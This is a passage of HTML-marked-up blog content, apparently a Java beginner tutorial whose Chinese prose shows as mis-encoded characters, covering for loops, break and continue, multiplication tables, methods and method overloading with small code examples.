class="comment">//è¿­ä»£</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;whileå¾ªç¯ç»“æŸ&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;forå¾ªç¯ç»“æŸ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">/*</span></span><br><span class="line"><span class="comment">    å…³äº forå¾ªç¯æœ‰ä»¥ä¸‹å‡ ç‚¹è¯´æ˜:</span></span><br><span class="line"><span class="comment">        æœ€å…ˆæ‰§è¡Œåˆå§‹åŒ–æ­¥éª¤ã€‚å¯ä»¥å£°æ˜ä¸€ç§ç±»å‹ï¼Œä½†å¯åˆå§‹åŒ–ä¸€ä¸ªæˆ–å¤šä¸ªå¾ªç¯æ§åˆ¶å˜é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯ç©ºè¯­å¥ã€‚</span></span><br><span class="line"><span class="comment">        ç„¶åï¼Œæ£€æµ‹å¸ƒå°”è¡¨è¾¾å¼çš„å€¼ã€‚å¦‚æœä¸º trueï¼Œå¾ªç¯ä½“è¢«æ‰§è¡Œã€‚å¦‚æœä¸ºfalseï¼Œå¾ªç¯ç»ˆæ­¢ï¼Œå¼€å§‹æ‰§è¡Œå¾ªç¯ä½“åé¢çš„è¯­å¥ã€‚æ‰§è¡Œä¸€æ¬¡å¾ªç¯åï¼Œæ›´æ–°å¾ªç¯æ§åˆ¶å˜é‡(è¿­ä»£å› å­æ§åˆ¶å¾ªç¯å˜é‡çš„å¢å‡)ã€‚</span></span><br><span class="line"><span class="comment">        å†æ¬¡æ£€æµ‹å¸ƒå°”è¡¨è¾¾å¼ã€‚å¾ªç¯æ‰§è¡Œä¸Šé¢çš„è¿‡ç¨‹ã€‚</span></span><br><span class="line"><span class="comment">        */</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—0åˆ°100ä¹‹é—´æ‰€æœ‰å¥‡æ•°å’Œå¶æ•°çš„å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> oddsum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> evensum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                oddsum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                evensum+=i;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(oddsum);</span><br><span class="line">        System.out.println(evensum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨whileå¾ªç¯æˆ–forå¾ªç¯è¾“å‡º1-1000ä¹‹é—´èƒ½è¢«5æ•´é™¤çš„æ•°ï¼Œå¹¶æ¯è¡Œè¾“å‡º3ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%(<span class="number">5</span>*<span class="number">3</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰“å°ä¹ä¹ä¹˜æ³•è¡¨"><a href="#æ‰“å°ä¹ä¹ä¹˜æ³•è¡¨" class="headerlink" title="æ‰“å°ä¹ä¹ä¹˜æ³•è¡¨"></a>æ‰“å°ä¹ä¹ä¹˜æ³•è¡¨</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=<span class="number">9</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= j; i++) &#123;</span><br><span class="line">                System.out.print(j+<span class="string">&quot;*&quot;</span>+i+<span class="string">&quot;=&quot;</span>+(j*i)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####å¢å¼ºforå¾ªç¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(å£°æ˜è¯­å¥ï¼šè¡¨è¾¾å¼)&#123;</span><br><span class="line"></span><br><span class="line">//ä»£ç å¥å­</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å£°æ˜è¯­å¥:å£°æ˜æ–°çš„å±€éƒ¨å˜é‡ï¼Œè¯¥å˜é‡çš„ç±»å‹å¿…é¡»å’Œæ•°ç»„å…ƒç´ çš„ç±»å‹åŒ¹é…ã€‚å…¶ä½œç”¨åŸŸé™å®šåœ¨å¾ªç¯è¯­å¥å—ï¼Œå…¶å€¼ä¸æ­¤æ—¶æ•°ç»„å…ƒç´ çš„å€¼ç›¸ç­‰ã€‚</p><p>è¡¨è¾¾å¼:è¡¨è¾¾å¼æ˜¯è¦è®¿é—®çš„æ•°ç»„åï¼Œæˆ–è€…æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []numbers=&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;<span class="comment">//å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(numbers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println (<span class="string">&quot;---------åˆ†å‰²çº¿--------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†æ•°ç»„çš„å…ƒç´ </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="break-continue"><a href="#break-continue" class="headerlink" title="break&amp;&amp;continue"></a>break&amp;&amp;continue</h4><p>breakåœ¨ä»»ä½•å¾ªç¯è¯­å¥çš„ä¸»ä½“éƒ¨åˆ†ï¼Œå‡å¯ç”¨breakæ§åˆ¶å¾ªç¯çš„æµç¨‹ã€‚breakç”¨äºå¼ºè¡Œé€€å‡ºå¾ªç¯ï¼Œ<strong>ä¸æ‰§è¡Œå¾ªç¯ä¸­å‰©ä½™çš„è¯­å¥</strong>ã€‚(breakè¯­å¥ä¹Ÿåœ¨switchè¯­å¥ä¸­ä½¿ç”¨)</p><p>continueè¯­å¥ç”¨åœ¨å¾ªç¯è¯­å¥ä½“ä¸­ï¼Œç”¨äº<strong>ç»ˆæ­¢æŸæ¬¡å¾ªç¯è¿‡ç¨‹</strong>ï¼Œå³è·³è¿‡å¾ªç¯ä½“ä¸­å°šæœªæ‰§è¡Œçš„è¯­å¥ï¼Œæ¥ç€è¿›è¡Œä¸‹ä¸€æ¬¡æ˜¯å¦æ‰§è¡Œå¾ªç¯çš„åˆ¤å®šã€‚<br><strong>å…³äºgotoå…³é”®å­—</strong><br>gotoå…³é”®å­—å¾ˆæ—©å°±åœ¨ç¨‹åºè®¾è®¡è¯­è¨€ä¸­å‡ºç°ã€‚å°½ç®¡gotoä»æ˜¯Javaçš„ä¸€ä¸ªä¿ç•™å­—ï¼Œä½†å¹¶æœªåœ¨è¯­è¨€ä¸­å¾—åˆ°æ­£å¼ä½¿ç”¨;Javaæ²¡æœ‰gotoã€‚ç„¶è€Œï¼Œåœ¨breakå’Œcontinueè¿™ä¸¤ä¸ªå…³é”®å­—çš„èº«ä¸Šï¼Œæˆ‘ä»¬ä»ç„¶èƒ½çœ‹å‡ºä¸€äº›gotoçš„å½±å­â€”å¸¦æ ‡ç­¾çš„breakå’Œcontinue.<br>â€œæ ‡ç­¾â€æ˜¯æŒ‡åé¢è·Ÿä¸€ä¸ªå†’å·çš„æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚:</p><p>å¯¹Javaæ¥è¯´å”¯ä¸€ç”¨åˆ°æ ‡ç­¾çš„åœ°æ–¹æ˜¯åœ¨å¾ªç¯è¯­å¥ä¹‹å‰ã€‚è€Œåœ¨å¾ªç¯ä¹‹å‰è®¾ç½®æ ‡ç­¾çš„å”¯ä¸€ç†ç”±æ˜¯:æˆ‘ä»¬å¸Œæœ›åœ¨å…¶ä¸­åµŒå¥—å¦-ä¸ªå¾ªç¯ï¼Œç”±äºbreakå’Œcontinueå…³é”®å­—é€šå¸¸åªä¸­æ–­å½“å‰å¾ªç¯ï¼Œä½†è‹¥éšåŒæ ‡ç­¾ä½¿ç”¨ï¼Œå®ƒä»¬å°±ä¼šä¸­æ–­åˆ°å­˜åœ¨æ ‡ç­¾çš„åœ°æ–¹ã€‚</p><h4 id="æ‰“å°ä¸‰è§’å½¢"><a href="#æ‰“å°ä¸‰è§’å½¢" class="headerlink" title="æ‰“å°ä¸‰è§’å½¢"></a>æ‰“å°ä¸‰è§’å½¢</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æ‰“å°ä¸‰è§’å½¢  5è¡Œ</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">5</span>; j&gt;=i ;j--) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Javaæ–¹æ³•"><a href="#Javaæ–¹æ³•" class="headerlink" title="Javaæ–¹æ³•"></a>Javaæ–¹æ³•</h2><p>ä»€ä¹ˆæ˜¯æ–¹æ³•ï¼Ÿ</p><p>Javaæ–¹æ³•æ˜¯è¯­å¥çš„é›†åˆï¼Œå®ƒä»¬åœ¨ä¸€èµ·æ‰§è¡Œä¸€ä¸ªåŠŸèƒ½ã€‚<br>æ–¹æ³•æ˜¯è§£å†³ä¸€ç±»é—®é¢˜çš„æ­¥éª¤çš„æœ‰åºç»„åˆ<br>æ–¹æ³•åŒ…å«äºç±»æˆ–å¯¹è±¡ä¸­<br>â—†æ–¹æ³•åœ¨ç¨‹åºä¸­è¢«åˆ›å»ºï¼Œåœ¨å…¶ä»–åœ°æ–¹è¢«å¼•ç”¨<br>è®¾è®¡æ–¹æ³•çš„åŸåˆ™:æ–¹æ³•çš„æœ¬æ„æ˜¯åŠŸèƒ½å—ï¼Œå°±æ˜¯å®ç°æŸä¸ªåŠŸèƒ½çš„è¯­å¥å—çš„é›†åˆã€‚æˆ‘ä»¬è®¾è®¡æ–¹æ³•çš„æ—¶å€™ï¼Œæœ€å¥½ä¿æŒæ–¹æ³•çš„åŸå­æ€§ï¼Œå°±æ˜¯ä¸€ä¸ªæ–¹æ³•åªå®Œæˆ1ä¸ªåŠŸèƒ½ï¼Œè¿™æ ·åˆ©äºæˆ‘ä»¬åæœŸçš„æ‰©å±•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        int sum = add(1,2);</span></span><br><span class="line"><span class="comment">//        System.out.println(sum);</span></span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åŠ æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i % (<span class="number">5</span> * <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•çš„å®šä¹‰"><a href="#æ–¹æ³•çš„å®šä¹‰" class="headerlink" title="æ–¹æ³•çš„å®šä¹‰"></a>æ–¹æ³•çš„å®šä¹‰</h4><p>Javaçš„æ–¹æ³•ç±»ä¼¼äºå…¶å®ƒè¯­è¨€çš„å‡½æ•°ï¼Œæ˜¯ä¸€æ®µç”¨æ¥å®Œæˆç‰¹å®šåŠŸèƒ½çš„ä»£ç ç‰‡æ®µï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå®šä¹‰ä¸€ä¸ªæ–¹æ³•åŒ…å«ä»¥ä¸‹è¯­æ³•:<br>æ–¹æ³•åŒ…å«ä¸€ä¸ªæ–¹æ³•å¤´å’Œä¸€ä¸ªæ–¹æ³•ä½“ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰éƒ¨åˆ†:<br>ä¿®é¥°ç¬¦:ä¿®é¥°ç¬¦ï¼Œè¿™æ˜¯å¯é€‰çš„ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å¦‚ä½•è°ƒç”¨è¯¥æ–¹æ³•ã€‚å®šä¹‰äº†è¯¥æ–¹æ³•çš„è®¿é—®ç±»å‹ã€‚<br>è¿”å›å€¼ç±»å‹âˆ¶æ–¹æ³•å¯èƒ½ä¼šè¿”å›å€¼ã€‚returnValueTypeæ˜¯æ–¹æ³•è¿”å›å€¼çš„æ•°æ®ç±»å‹ã€‚æœ‰äº›æ–¹æ³•æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼Œä½†æ²¡æœ‰è¿”å›å€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒreturnValueTypeæ˜¯å…³é”®å­—voidã€‚<br>æ–¹æ³•å:æ˜¯æ–¹æ³•çš„å®é™…åç§°ã€‚æ–¹æ³•åå’Œå‚æ•°è¡¨å…±åŒæ„æˆæ–¹æ³•ç­¾åã€‚<br>å‚æ•°ç±»å‹:å‚æ•°åƒæ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚å½“æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼ é€’å€¼ç»™å‚æ•°ã€‚è¿™ä¸ªå€¼è¢«ç§°ä¸ºå®å‚æˆ–å˜é‡ã€‚å‚æ•°åˆ—è¡¨æ˜¯æŒ‡æ–¹æ³•çš„å‚æ•°ç±»å‹ã€é¡ºåºå’Œå‚æ•°çš„ä¸ªæ•°ã€‚å‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ–¹æ³•å¯ä»¥ä¸åŒ…å«ä»»ä½•å‚æ•°ã€‚<br>å½¢å¼å‚æ•°:åœ¨æ–¹æ³•è¢«è°ƒç”¨æ—¶ç”¨äºæ¥æ”¶å¤–ç•Œè¾“å…¥çš„æ•°æ®ã€‚</p><p>å®å‚:è°ƒç”¨æ–¹æ³•æ—¶å®é™…ä¼ ç»™æ–¹æ³•çš„æ•°æ®ã€‚<br>æ–¹æ³•ä½“:æ–¹æ³•ä½“åŒ…å«å…·ä½“çš„è¯­å¥ï¼Œå®šä¹‰è¯¥æ–¹æ³•çš„åŠŸèƒ½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä¿®é¥°ç¬¦è¿”å›å€¼ç±»å‹æ–¹æ³•å(å‚æ•°ç±»å‹å‚æ•°å)&#123;</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">æ–¹æ³•ä½“</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line"><span class="keyword">return</span> è¿”å›å€¼ï¼›&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> max=max(<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>javaéƒ½æ˜¯å€¼ä¼ é€’</strong></p><h4 id="æ–¹æ³•çš„é‡è½½"><a href="#æ–¹æ³•çš„é‡è½½" class="headerlink" title="æ–¹æ³•çš„é‡è½½"></a>æ–¹æ³•çš„é‡è½½</h4><blockquote><p>é‡æˆªå°±æ˜¯åœ¨ä¸€ä¸ªç±»ä¸­æœ‰ç›¸åŒçš„å‡½æ•°åç§°ï¼Œä½†å½¢å‚ä¸åŒçš„å‡½æ•°ã€‚<br>æ–¹æ³•çš„é‡è½½çš„è§„åˆ™:<br>æ–¹æ³•åç§°å¿…é¡»ç›¸åŒã€‚<br>å‚æ•°åˆ—è¡¨å¿…é¡»ä¸åŒ(ä¸ªæ•°ä¸åŒã€æˆ–ç±»å‹ä¸åŒã€å‚æ•°æ’åˆ—é¡ºåºä¸åŒç­‰)ã€‚æ–¹æ³•çš„è¿”å›ç±»å‹å¯ä»¥ç›¸åŒä¹Ÿå¯ä»¥ä¸ç›¸åŒã€‚<br>ä»…ä»…è¿”å›ç±»å‹ä¸åŒä¸è¶³ä»¥æˆä¸ºæ–¹æ³•çš„é‡è½½ã€‚<br>å®ç°ç†è®º:<br>æ–¹æ³•åç§°ç›¸åŒæ—¶ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®è°ƒç”¨æ–¹æ³•çš„å‚æ•°ä¸ªæ•°ã€å‚æ•°ç±»å‹ç­‰å»é€ä¸ªåŒ¹é…ï¼Œä»¥é€‰æ‹©å¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚æœåŒ¹é…å¤±è´¥ï¼Œåˆ™ç¼–è¯‘å™¨æŠ¥é”™ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> max=max(<span class="number">30.0</span>,<span class="number">10.0</span>,<span class="number">90.0</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> 